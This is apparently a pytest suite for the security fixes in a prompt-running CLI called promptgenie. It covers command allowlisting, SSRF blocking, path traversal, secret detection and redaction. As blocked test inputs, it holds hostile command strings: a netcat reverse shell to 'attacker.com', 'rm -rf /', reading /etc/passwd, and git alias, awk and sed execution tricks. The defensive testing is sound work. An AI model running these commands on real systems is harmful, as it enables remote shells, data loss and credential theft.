"""Tests for the security fixes introduced in the security hardening pass.

Covers:
  - VULN-001: shell=True removal / command allowlist (_validate_cmd_allowed)
  - VULN-002: SSRF / URL scheme validation (_check_url_allowed)
  - VULN-002: Path traversal protection in _gather_file
  - VULN-003: Secrets gate hard-block (run_engine._check_secrets_gate +
              _run_spec_async raising EXIT_SECRETS)
  - F-002: HTTP blocked by default; DNS rebinding prevention
  - Priority-1: Safe file I/O (already covered by test_fileio.py — duplicates
                omitted, only new surface tested)
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

from promptgenie.core.context_builder import (
    SecurityError,
    _check_url_allowed,
    _gather_stdin,
    _validate_cmd_allowed,
    build_context,
)
from promptgenie.core.errors import EXIT_SECRETS, EXIT_USAGE, PromptGenieError
from promptgenie.core.run_engine import _check_secrets_gate
from promptgenie.core.spec import ContextSource

# ---------------------------------------------------------------------------
# VULN-002 / F-002: URL scheme / SSRF validation
# ---------------------------------------------------------------------------


class TestCheckUrlAllowed:
    """_check_url_allowed must raise SecurityError for disallowed schemes and IPs."""

    def test_https_allowed(self):
        # Should not raise
        _check_url_allowed("https://example.com/data.txt")

    def test_http_blocked_by_default(self):
        """Plain HTTP must be blocked unless allow_insecure=True (CWE-319)."""
        with pytest.raises(SecurityError, match="[Hh][Tt][Tt][Pp]"):
            _check_url_allowed("http://example.com/data.txt")

    def test_http_allowed_with_insecure_flag(self):
        """HTTP is permitted when the caller explicitly sets allow_insecure=True."""
        # Should not raise — but does emit a warning
        import warnings

        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            _check_url_allowed("http://example.com/data.txt", allow_insecure=True)
        # A security warning must have been issued
        assert any("WARNING" in str(warning.message).upper() for warning in w)

    def test_file_scheme_blocked(self):
        with pytest.raises(SecurityError, match="file"):
            _check_url_allowed("file:///etc/passwd")

    def test_ftp_scheme_blocked(self):
        with pytest.raises(SecurityError, match="ftp"):
            _check_url_allowed("ftp://example.com/file")

    def test_data_scheme_blocked(self):
        with pytest.raises(SecurityError, match="data"):
            _check_url_allowed("data:text/plain;base64,dGVzdA==")

    def test_loopback_ipv4_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://127.0.0.1/admin")

    def test_loopback_ipv4_variant_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://127.255.255.255/secret")

    def test_private_10x_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://10.0.0.1/internal-api")

    def test_private_172_16_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://172.16.0.1/data")

    def test_private_172_31_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://172.31.255.255/data")

    def test_private_192_168_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://192.168.1.100/config")

    def test_link_local_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://169.254.169.254/latest/meta-data/")

    def test_ipv6_loopback_blocked(self):
        with pytest.raises(SecurityError, match="internal"):
            _check_url_allowed("https://[::1]/admin")

    def test_https_hostname_passes_static_check(self):
        # Hostname-based HTTPS URLs pass without network access when the mock
        # resolves to a public IP.  We mock getaddrinfo to return a public addr.
        with patch(
            "promptgenie.core.context_builder.socket.getaddrinfo",
            return_value=[(2, 1, 6, "", ("93.184.216.34", 0))],
        ):
            _check_url_allowed("https://example.com/data.txt")

    def test_dns_rebinding_blocked(self):
        """A public hostname that resolves to a private IP must be blocked (CWE-918)."""
        with (
            patch(
                "promptgenie.core.context_builder.socket.getaddrinfo",
                return_value=[(2, 1, 6, "", ("192.168.1.1", 0))],
            ),
            pytest.raises(SecurityError, match="rebinding|internal"),
        ):
            _check_url_allowed("https://evil.attacker.com/steal")

    def test_dns_resolution_failure_does_not_block(self):
        """If DNS resolution fails (offline / NXDOMAIN), we let the connection
        fail naturally rather than blocking — avoids false positives."""
        import socket

        with patch(
            "promptgenie.core.context_builder.socket.getaddrinfo",
            side_effect=socket.gaierror("name not resolved"),
        ):
            # Should not raise SecurityError
            _check_url_allowed("https://nxdomain.invalid/path")

    def test_empty_scheme_blocked(self):
        with pytest.raises(SecurityError):
            _check_url_allowed("//no-scheme.com/path")


# ---------------------------------------------------------------------------
# VULN-001: Command allowlist / shell=True removal
# ---------------------------------------------------------------------------


class TestValidateCmdAllowed:
    """_validate_cmd_allowed must parse safely and reject disallowed executables."""

    def test_allowed_git_command(self):
        argv = _validate_cmd_allowed("git log --oneline -10")
        assert argv[0] == "git"
        assert argv[1] == "log"

    def test_allowed_echo_command(self):
        argv = _validate_cmd_allowed("echo hello world")
        assert argv == ["echo", "hello", "world"]

    def test_disallowed_rm_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("rm -rf /")

    def test_disallowed_curl_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("curl http://example.com")

    def test_disallowed_bash_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("bash -c 'cat /etc/passwd'")

    def test_disallowed_sh_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("sh exploit.sh")

    def test_disallowed_nc_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("nc -e /bin/sh attacker.com 4444")

    def test_path_prefix_stripped(self):
        # /usr/bin/rm should still be blocked because the executable name is 'rm'
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("/usr/bin/rm -rf /tmp/something")

    def test_empty_command_raises(self):
        with pytest.raises(SecurityError, match="[Ee]mpty"):
            _validate_cmd_allowed("")

    def test_invalid_shell_syntax_raises(self):
        with pytest.raises(SecurityError):
            _validate_cmd_allowed("echo 'unclosed quote")

    def test_returns_list(self):
        result = _validate_cmd_allowed("git status --short")
        assert isinstance(result, list)
        assert len(result) == 3


# ---------------------------------------------------------------------------
# VULN-002: Path traversal protection in _gather_file
# ---------------------------------------------------------------------------


class TestPathTraversalProtection:
    """_gather_file must refuse to read files outside base_dir."""

    def test_traversal_blocked(self, tmp_path):
        from promptgenie.core.context_builder import _gather_file

        # Create a valid base_dir with a subdirectory
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        outside_file = tmp_path / "secret.txt"
        outside_file.write_text("TOP SECRET", encoding="utf-8")

        with pytest.raises(SecurityError, match="outside"):
            _gather_file("../secret.txt", "", 0, project_dir, [])

    def test_legitimate_file_within_base_allowed(self, tmp_path):
        from promptgenie.core.context_builder import _gather_file

        project_dir = tmp_path / "project"
        project_dir.mkdir()
        target = project_dir / "README.md"
        target.write_text("# Hello", encoding="utf-8")

        entry = _gather_file("README.md", "", 0, project_dir, [])
        assert entry is not None
        assert entry.content == "# Hello"

    def test_absolute_path_outside_base_blocked(self, tmp_path):
        from promptgenie.core.context_builder import _gather_file

        project_dir = tmp_path / "project"
        project_dir.mkdir()
        outside_file = tmp_path / "outside.txt"
        outside_file.write_text("should not read", encoding="utf-8")

        with pytest.raises(SecurityError, match="outside"):
            _gather_file(str(outside_file), "", 0, project_dir, [])

    def test_symlink_traversal_blocked(self, tmp_path):
        """A symlink inside base_dir that points outside must be blocked."""
        import os

        from promptgenie.core.context_builder import _gather_file

        project_dir = tmp_path / "project"
        project_dir.mkdir()
        outside_file = tmp_path / "sensitive.txt"
        outside_file.write_text("sensitive data", encoding="utf-8")
        link = project_dir / "link_to_outside.txt"
        os.symlink(outside_file, link)

        with pytest.raises(SecurityError, match="outside"):
            _gather_file("link_to_outside.txt", "", 0, project_dir, [])


# ---------------------------------------------------------------------------
# VULN-003: Secrets gate — hard block
# ---------------------------------------------------------------------------


class TestSecretsGateHardBlock:
    """The secrets gate must return findings for known secret patterns."""

    def test_openai_key_detected(self):
        prompt = "Use this key: sk-abcdefghijklmnopqrstuvwxyz123456"
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0

    def test_aws_access_key_detected(self):
        prompt = "Access key: AKIAIOSFODNN7EXAMPLE"
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0

    def test_github_pat_detected(self):
        prompt = "Token: ghp_" + "A" * 36
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0

    def test_clean_prompt_no_findings(self):
        prompt = "Please summarize the following document and list the key points."
        warnings = _check_secrets_gate(prompt)
        assert warnings == []

    def test_private_key_detected(self):
        prompt = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."
        warnings = _check_secrets_gate(prompt)
        assert len(warnings) > 0


class TestRunEngineSecretsBlock:
    """run_spec must raise EXIT_SECRETS when secrets found (unless allow_secrets=True)."""

    def _make_spec(self, tmp_path):
        from promptgenie.core.spec import OutputContract, PromptSpec, RunOptions

        spec = PromptSpec(
            version=1,
            name="test",
            target="claude-code",
            prompt="Use this OpenAI key: sk-" + "x" * 40,
            run=RunOptions(dry_run=False, stream=False),
            output_contract=OutputContract(),
        )
        spec._source_path = tmp_path / "test.yaml"
        return spec

    def test_secrets_gate_raises_exit_secrets(self, tmp_path):
        from promptgenie.core.run_engine import run_spec

        spec = self._make_spec(tmp_path)
        with pytest.raises((PromptGenieError, SystemExit)) as exc_info:
            run_spec(spec, no_input=True, dry_run=True)
        # With dry_run=True, secrets gate fires before provider call
        # The check runs on the assembled prompt which includes the secret
        exc = exc_info.value
        if isinstance(exc, PromptGenieError):
            assert exc.code == EXIT_SECRETS
        # SystemExit(6) is also acceptable from handle_error path

    def test_dry_run_with_allow_secrets_does_not_raise(self, tmp_path):
        """allow_secrets=True should emit warnings but not block."""
        from promptgenie.core.run_engine import run_spec

        spec = self._make_spec(tmp_path)
        # Should complete (dry_run, no provider call) without raising
        result = run_spec(spec, no_input=True, dry_run=True, allow_secrets=True)
        assert result.dry_run is True
        # Warnings should have been emitted as events
        warning_events = [e for e in result.events if e.event == "warning"]
        assert len(warning_events) > 0


# ---------------------------------------------------------------------------
# SecurityError is a PromptGenieError subclass
# ---------------------------------------------------------------------------


class TestSecurityErrorSubclass:
    def test_security_error_is_promptgenie_error(self):
        err = SecurityError("blocked", code=EXIT_USAGE)
        assert isinstance(err, PromptGenieError)
        assert err.code == EXIT_USAGE


# ---------------------------------------------------------------------------
# F-002: _gather_url — URL gating, error paths, allow_insecure coverage
# ---------------------------------------------------------------------------


class TestGatherUrlSecurity:
    """_gather_url gate + error path coverage (no live network requests)."""

    def test_url_blocked_when_no_url_true(self):
        from promptgenie.core.context_builder import _gather_url

        with pytest.raises(PromptGenieError, match="blocked"):
            _gather_url("https://example.com/data.txt", "", 0, no_url=True)

    def test_url_blocked_by_ssrf_check(self):
        """Security check raises before any network call."""
        from promptgenie.core.context_builder import _gather_url

        with pytest.raises(SecurityError):
            _gather_url("https://192.168.1.1/secret", "", 0, no_url=False)

    def test_url_fetch_error_wrapped(self):
        """Network errors are wrapped in PromptGenieError, not leaked raw."""
        from unittest.mock import patch

        from promptgenie.core.context_builder import _gather_url

        with (
            patch("promptgenie.core.context_builder._check_url_allowed"),
            patch(
                "promptgenie.core.context_builder.urllib.request.urlopen",
                side_effect=OSError("connection refused"),
            ),
            pytest.raises(PromptGenieError, match="Failed to fetch"),
        ):
            _gather_url("https://example.com/data.txt", "", 0, no_url=False)

    def test_url_allow_insecure_passes_flag(self):
        """allow_insecure=True is forwarded to _check_url_allowed."""
        from unittest.mock import MagicMock, patch

        import promptgenie.core.context_builder as cb

        mock_resp = MagicMock()
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_resp.read.return_value = b"hello"

        with (
            patch.object(cb, "_check_url_allowed", return_value=[]) as mock_check,
            patch(
                "promptgenie.core.context_builder.urllib.request.urlopen",
                return_value=mock_resp,
            ),
        ):
            # Empty validated-IP list -> falls back to urlopen path (this test's intent).
            cb._gather_url("http://example.com/data", "lbl", 0, no_url=False, allow_insecure=True)
            mock_check.assert_called_once_with("http://example.com/data", allow_insecure=True)


# ---------------------------------------------------------------------------
# F-001: _gather_git uses hardcoded argv (shell=False, not driven by spec)
# ---------------------------------------------------------------------------


class TestGatherGitSecure:
    """_gather_git must use hardcoded argv with shell=False."""

    def test_gather_git_diff_no_shell(self):
        from unittest.mock import MagicMock, patch

        from promptgenie.core.context_builder import _gather_git

        mock_result = MagicMock()
        mock_result.stdout = "diff --git a/foo b/foo\n"

        with patch(
            "promptgenie.core.context_builder.subprocess.run", return_value=mock_result
        ) as mock_run:
            entry = _gather_git(staged=False, label="")
        # Must be called with shell=False
        call_kwargs = mock_run.call_args[1]
        assert call_kwargs.get("shell") is False
        assert entry.content == "diff --git a/foo b/foo\n"
        assert entry.source_type == "git_diff"

    def test_gather_git_staged_no_shell(self):
        from unittest.mock import MagicMock, patch

        from promptgenie.core.context_builder import _gather_git

        mock_result = MagicMock()
        mock_result.stdout = ""

        with patch(
            "promptgenie.core.context_builder.subprocess.run", return_value=mock_result
        ) as mock_run:
            entry = _gather_git(staged=True, label="my-staged")
        call_kwargs = mock_run.call_args[1]
        assert call_kwargs.get("shell") is False
        assert entry.source_type == "git_staged"
        assert entry.label == "my-staged"
        assert entry.content == "(no diff)\n"

    def test_gather_git_file_not_found_graceful(self):
        """FileNotFoundError (git not installed) must be handled gracefully."""
        from unittest.mock import patch

        from promptgenie.core.context_builder import _gather_git

        with patch(
            "promptgenie.core.context_builder.subprocess.run",
            side_effect=FileNotFoundError("git not found"),
        ):
            entry = _gather_git(staged=False, label="")
        assert "git not available" in entry.content


# ---------------------------------------------------------------------------
# Q-002: allow_secrets=True branch in run_engine
# ---------------------------------------------------------------------------


class TestSecretsGateAllowBranch:
    """The allow_secrets=True branch must emit warning events and not block."""

    def test_allow_secrets_emits_warning_event(self, tmp_path):
        from promptgenie.core.run_engine import run_spec
        from promptgenie.core.spec import OutputContract, PromptSpec, RunOptions

        spec = PromptSpec(
            version=1,
            name="allow-secrets-test",
            target="claude-code",
            prompt="My token is ghp_" + "B" * 36,
            run=RunOptions(dry_run=True, stream=False),
            output_contract=OutputContract(),
        )
        spec._source_path = tmp_path / "test.yaml"

        result = run_spec(spec, no_input=True, dry_run=True, allow_secrets=True)
        assert result.dry_run is True
        warning_events = [e for e in result.events if e.event == "warning"]
        assert len(warning_events) > 0
        # The warning message should mention the secrets gate
        assert any("secrets-gate" in (e.data or {}).get("message", "") for e in warning_events)


# ---------------------------------------------------------------------------
# S-1: Command allowlist hardening (interpreters/exec primitives removed)
# ---------------------------------------------------------------------------


class TestS1AllowlistHardening:
    """Interpreters & code-exec primitives must no longer pass the allowlist."""

    def test_python3_eval_blocked(self):
        with pytest.raises(SecurityError):
            _validate_cmd_allowed("python3 -c 'print(1)'")

    def test_python_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("python script.py")

    def test_node_eval_blocked(self):
        with pytest.raises(SecurityError):
            _validate_cmd_allowed("node -e 'process.exit(0)'")

    def test_awk_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("awk 'BEGIN{system(\"id\")}'")

    def test_find_exec_blocked(self):
        # 'find' is removed from the allowlist entirely.
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("find . -exec cat {} ;")

    def test_env_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("env sh -c 'id'")

    def test_make_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("make all")

    def test_sed_blocked(self):
        with pytest.raises(SecurityError, match="allowed"):
            _validate_cmd_allowed("sed 'e id' file")

    # --- still-allowed read-only tools ---
    def test_git_log_allowed(self):
        argv = _validate_cmd_allowed("git log --oneline -5")
        assert argv[:2] == ["git", "log"]

    def test_cat_allowed(self):
        argv = _validate_cmd_allowed("cat README.md")
        assert argv == ["cat", "README.md"]

    def test_grep_allowed(self):
        argv = _validate_cmd_allowed("grep x file.txt")
        assert argv[0] == "grep"

    # --- argument-level eval-flag denylist (defence in depth) ---
    def test_eval_flag_long_blocked(self):
        # Even a hypothetical allowlisted tool may not carry --eval.
        with pytest.raises(SecurityError):
            _validate_cmd_allowed("grep --eval=foo file")


class TestS1GitSubcommandAllowlist:
    """git is restricted to read-only subcommands and -c is rejected."""

    def test_git_push_blocked(self):
        with pytest.raises(SecurityError, match="read-only|allowlist"):
            _validate_cmd_allowed("git push origin main")

    def test_git_config_write_blocked(self):
        with pytest.raises(SecurityError, match="read-only|allowlist"):
            _validate_cmd_allowed("git config user.x y")

    def test_git_dash_c_alias_shell_blocked(self):
        with pytest.raises(SecurityError, match="config injection|-c"):
            _validate_cmd_allowed("git -c alias.x=!sh log")

    def test_git_diff_allowed(self):
        argv = _validate_cmd_allowed("git diff --staged")
        assert argv[:2] == ["git", "diff"]

    def test_git_status_allowed(self):
        argv = _validate_cmd_allowed("git status --short")
        assert argv[:2] == ["git", "status"]


# ---------------------------------------------------------------------------
# S-3: env context source credential exfiltration block
# ---------------------------------------------------------------------------


class TestS3EnvExfiltration:
    """Credential-like env vars must be refused unless explicitly allowed."""

    def test_aws_secret_blocked(self, monkeypatch):
        from promptgenie.core.context_builder import _gather_env

        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "abc123")
        with pytest.raises(SecurityError, match="credential-like"):
            _gather_env("AWS_SECRET_ACCESS_KEY", "")

    def test_anthropic_key_blocked(self, monkeypatch):
        from promptgenie.core.context_builder import _gather_env

        monkeypatch.setenv("ANTHROPIC_API_KEY", "unit-test-api-key")
        with pytest.raises(SecurityError, match="credential-like"):
            _gather_env("ANTHROPIC_API_KEY", "")

    def test_benign_var_allowed(self, monkeypatch):
        from promptgenie.core.context_builder import _gather_env

        monkeypatch.setenv("MY_PROJECT_NAME", "promptgenie")
        entry = _gather_env("MY_PROJECT_NAME", "")
        assert entry is not None
        assert entry.content == "promptgenie"

    def test_override_flag_permits_sensitive(self, monkeypatch):
        import warnings

        from promptgenie.core.context_builder import _gather_env

        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "abc123")
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            entry = _gather_env("AWS_SECRET_ACCESS_KEY", "", allow_sensitive_env=True)
        assert entry is not None
        assert entry.content == "abc123"
        assert any("WARNING" in str(x.message).upper() for x in w)


# ---------------------------------------------------------------------------
# S-5: SSRF DNS pinning (validated IP is what gets connected to)
# ---------------------------------------------------------------------------


class TestS5DnsPinning:
    """_check_url_allowed returns validated IPs; _gather_url pins to them."""

    def test_check_url_returns_validated_ip(self):
        with patch("promptgenie.core.context_builder.socket.getaddrinfo") as gai:
            gai.return_value = [(2, 1, 6, "", ("93.184.216.34", 0))]
            ips = _check_url_allowed("https://example.com/data.txt")
        assert ips == ["93.184.216.34"]

    def test_private_resolution_still_blocked(self):
        with patch("promptgenie.core.context_builder.socket.getaddrinfo") as gai:
            gai.return_value = [(2, 1, 6, "", ("10.0.0.5", 0))]
            with pytest.raises(SecurityError, match="rebinding|private"):
                _check_url_allowed("https://evil.example.com/x")

    def test_gather_url_pins_validated_ip(self):
        from promptgenie.core import context_builder as cb

        captured = {}

        def fake_fetch(url, pinned_ip, max_bytes, timeout=20):
            captured["ip"] = pinned_ip
            return b"hello world"

        with (
            patch.object(cb.socket, "getaddrinfo") as gai,
            patch.object(cb, "_fetch_pinned", side_effect=fake_fetch),
        ):
            gai.return_value = [(2, 1, 6, "", ("93.184.216.34", 0))]
            entry = cb._gather_url("https://example.com/x", "", 0, no_url=False)
        assert captured["ip"] == "93.184.216.34"
        assert entry.content == "hello world"


# ---------------------------------------------------------------------------
# S-2: spec trust store + run gate
# ---------------------------------------------------------------------------


class TestSpecTrust:
    """promptgenie.core.trust — trust store + spec_requires_trust + run gate."""

    def _spec(self, *, with_cmd=False, inline_only=False):
        from promptgenie.core.spec import (
            ContextSource,
            OutputContract,
            PromptSpec,
            RunOptions,
        )

        ctx = []
        if with_cmd:
            ctx = [ContextSource(type="cmd", command="git log")]
        spec = PromptSpec(
            version=1,
            name="trust-test",
            target="claude-code",
            prompt="hello" if inline_only else "",
            context=ctx,
            run=RunOptions(dry_run=True, stream=False),
            output_contract=OutputContract(),
        )
        return spec

    def test_requires_trust_with_cmd(self):
        from promptgenie.core.trust import spec_requires_trust

        assert spec_requires_trust(self._spec(with_cmd=True)) is True

    def test_inline_only_does_not_require_trust(self):
        from promptgenie.core.trust import spec_requires_trust

        assert spec_requires_trust(self._spec(inline_only=True)) is False

    def test_add_revoke_is_trusted_roundtrip(self, tmp_path, monkeypatch):
        import promptgenie.core.trust as trust

        monkeypatch.setattr(trust, "_TRUST_FILE", tmp_path / "trust.json")
        spec_path = tmp_path / "spec.yaml"
        spec_path.write_text("version: 1\n", encoding="utf-8")

        assert trust.is_trusted(spec_path) is False
        trust.add_trust(spec_path)
        assert trust.is_trusted(spec_path) is True
        records = trust.list_trusted()
        assert len(records) == 1
        trust.revoke_trust(spec_path)
        assert trust.is_trusted(spec_path) is False

    def test_editing_trusted_spec_invalidates(self, tmp_path, monkeypatch):
        import promptgenie.core.trust as trust

        monkeypatch.setattr(trust, "_TRUST_FILE", tmp_path / "trust.json")
        spec_path = tmp_path / "spec.yaml"
        spec_path.write_text("version: 1\n", encoding="utf-8")
        trust.add_trust(spec_path)
        assert trust.is_trusted(spec_path) is True
        # Edit the content -> content hash changes -> trust invalidated.
        spec_path.write_text("version: 1\n# changed\n", encoding="utf-8")
        assert trust.is_trusted(spec_path) is False

    def test_trust_file_is_mode_0600(self, tmp_path, monkeypatch):
        import promptgenie.core.trust as trust

        tf = tmp_path / "trust.json"
        monkeypatch.setattr(trust, "_TRUST_FILE", tf)
        spec_path = tmp_path / "spec.yaml"
        spec_path.write_text("version: 1\n", encoding="utf-8")
        trust.add_trust(spec_path)
        assert (tf.stat().st_mode & 0o777) == 0o600

    def test_untrusted_cmd_spec_aborts_no_input(self, tmp_path, monkeypatch):
        from click.testing import CliRunner

        import promptgenie.core.trust as trust
        from promptgenie.cli import cli

        monkeypatch.setattr(trust, "_TRUST_FILE", tmp_path / "trust.json")
        spec_path = tmp_path / "spec.yaml"
        spec_path.write_text(
            "version: 1\nname: t\ntarget: claude-code\nprompt: hi\n"
            "context:\n  - type: cmd\n    command: git log\n",
            encoding="utf-8",
        )
        runner = CliRunner()
        result = runner.invoke(cli, ["run", str(spec_path), "--no-input", "--dry-run"])
        assert result.exit_code == EXIT_USAGE
        assert "not trusted" in result.output.lower() or "trust" in result.output.lower()

    def test_untrusted_cmd_spec_passes_with_trust_flag(self, tmp_path, monkeypatch):
        from click.testing import CliRunner

        import promptgenie.core.trust as trust
        from promptgenie.cli import cli

        monkeypatch.setattr(trust, "_TRUST_FILE", tmp_path / "trust.json")
        spec_path = tmp_path / "spec.yaml"
        spec_path.write_text(
            "version: 1\nname: t\ntarget: claude-code\nprompt: hi\n"
            "context:\n  - type: cmd\n    command: git status\n",
            encoding="utf-8",
        )
        runner = CliRunner()
        result = runner.invoke(cli, ["run", str(spec_path), "--no-input", "--dry-run", "--trust"])
        # Dry-run exits EXIT_OK; the trust gate must not have aborted.
        assert "not trusted" not in result.output.lower()
        assert trust.is_trusted(spec_path) is True


# ---------------------------------------------------------------------------
# S-4: run history permissions + secret redaction
# ---------------------------------------------------------------------------


class TestS4HistoryRedaction:
    """RunWriter must redact secrets and create files with mode 0o600."""

    def test_prompt_secret_redacted_and_mode_0600(self, tmp_path, monkeypatch):
        import promptgenie.core.history as history

        monkeypatch.setattr(history, "_RUNS_DIR", tmp_path / "runs")
        fake_key = "sk-ant-" + "A" * 95
        writer = history.RunWriter(
            run_id="abcd1234",
            spec_name="s",
            target="claude-code",
            provider="anthropic",
            model="claude",
            dry_run=False,
            prompt=f"My key is {fake_key}",
            store_content=True,  # opt in so bodies are persisted (then must be redacted)
        )
        writer._ensure_file()
        writer.write_token("response with " + fake_key)
        writer.finish(status="ok")

        path = writer._path
        assert path is not None
        text = path.read_text(encoding="utf-8")
        # Prompt secret must not appear; redaction placeholder must.
        assert fake_key not in text.split('"prompt"')[1].split("}")[0]
        assert "[REDACTED]" in text
        # File permissions must be 0o600.
        assert (path.stat().st_mode & 0o777) == 0o600

    def test_response_redacted_in_done_event(self, tmp_path, monkeypatch):
        import json as _json

        import promptgenie.core.history as history

        monkeypatch.setattr(history, "_RUNS_DIR", tmp_path / "runs")
        fake_key = "sk-ant-" + "B" * 95
        writer = history.RunWriter(
            run_id="resp1234",
            spec_name="s",
            target="claude-code",
            provider="anthropic",
            model="claude",
            dry_run=False,
            prompt="clean prompt",
            store_content=True,  # opt in so the response body is persisted (then redacted)
        )
        writer._ensure_file()
        writer.write_token("here is " + fake_key)
        writer.finish(status="ok")

        done_line = [
            ln
            for ln in writer._path.read_text(encoding="utf-8").splitlines()
            if '"event": "done"' in ln
        ][0]
        done = _json.loads(done_line)
        assert fake_key not in done["response"]
        assert "[REDACTED]" in done["response"]


# ---------------------------------------------------------------------------
# V-001: spec must not be able to bypass the --allow-url egress gate
# ---------------------------------------------------------------------------


class TestV001UrlGateNotBypassable:
    """A url ContextSource must respect the user-controlled no_url gate
    regardless of any spec-supplied attribute."""

    def test_url_blocked_when_no_url_true(self, tmp_path):
        sources = [ContextSource(type="url", url="https://example.com/data.txt")]
        with pytest.raises(PromptGenieError):
            build_context(sources, base_dir=tmp_path, no_url=True)

    def test_stray_policy_gated_attribute_is_ignored(self, tmp_path):
        # Even if a malicious caller monkeypatches a policy_gated=False attribute
        # onto the source, the gate must NOT be weakened — the attribute is gone
        # from the dataclass and no longer consulted.
        src = ContextSource(type="url", url="https://example.com/data.txt")
        # Deliberately set a stray attribute (dynamic name) to prove it is ignored.
        setattr(src, "policy_gated", False)  # noqa: B010
        with pytest.raises(PromptGenieError):
            build_context([src], base_dir=tmp_path, no_url=True)

    def test_allow_url_still_works(self, tmp_path, monkeypatch):
        # With no_url=False (--allow-url) the gate is open; we stub the network
        # fetch to confirm the request is attempted rather than blocked.
        import promptgenie.core.context_builder as cb

        called: dict[str, str] = {}

        def fake_gather_url(url, label, max_bytes, *, no_url, allow_insecure):
            called["url"] = url
            assert no_url is False
            return cb.SourceEntry(
                label=label or url,
                source_type="url",
                content="ok",
                sha256="x",
                token_estimate=1,
            )

        monkeypatch.setattr(cb, "_gather_url", fake_gather_url)
        src = ContextSource(type="url", url="https://example.com/data.txt")
        manifest = build_context([src], base_dir=tmp_path, no_url=False)
        assert called["url"] == "https://example.com/data.txt"
        assert manifest.entries


# ---------------------------------------------------------------------------
# Resource caps (stdin truncation + glob file cap)
# ---------------------------------------------------------------------------


class TestResourceCaps:
    def test_stdin_truncated_to_max_bytes(self, monkeypatch):
        import io

        monkeypatch.setattr("sys.stdin", io.StringIO("x" * 5000))
        entry = _gather_stdin("in", max_bytes=100)
        assert len(entry.content) == 100

    def test_stdin_unbounded_without_cap(self, monkeypatch):
        import io

        monkeypatch.setattr("sys.stdin", io.StringIO("y" * 300))
        entry = _gather_stdin("in")
        assert len(entry.content) == 300

    def test_glob_stops_at_cap(self, tmp_path, monkeypatch):
        import promptgenie.core.context_builder as cb

        monkeypatch.setattr(cb, "_GLOB_MAX_FILES", 5)
        for i in range(20):
            (tmp_path / f"f{i:02d}.txt").write_text("data", encoding="utf-8")
        sources = [ContextSource(type="glob", pattern="*.txt")]
        manifest = build_context(sources, base_dir=tmp_path)
        assert len(manifest.entries) == 5
